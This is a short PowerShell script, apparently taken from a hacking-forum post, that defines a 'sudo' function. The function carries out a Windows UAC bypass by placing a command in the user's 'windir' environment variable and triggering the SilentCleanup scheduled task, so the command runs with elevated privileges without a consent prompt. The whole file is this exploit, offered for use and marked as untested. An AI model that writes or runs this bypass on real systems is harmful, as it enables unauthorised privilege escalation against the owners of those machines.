# Source: https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/
# Yet untested!!!!!!!!!!!!!!!!!

function sudo {

	$command = "powershell -noexit " + $args + ";#";
	
    Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
    Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
}
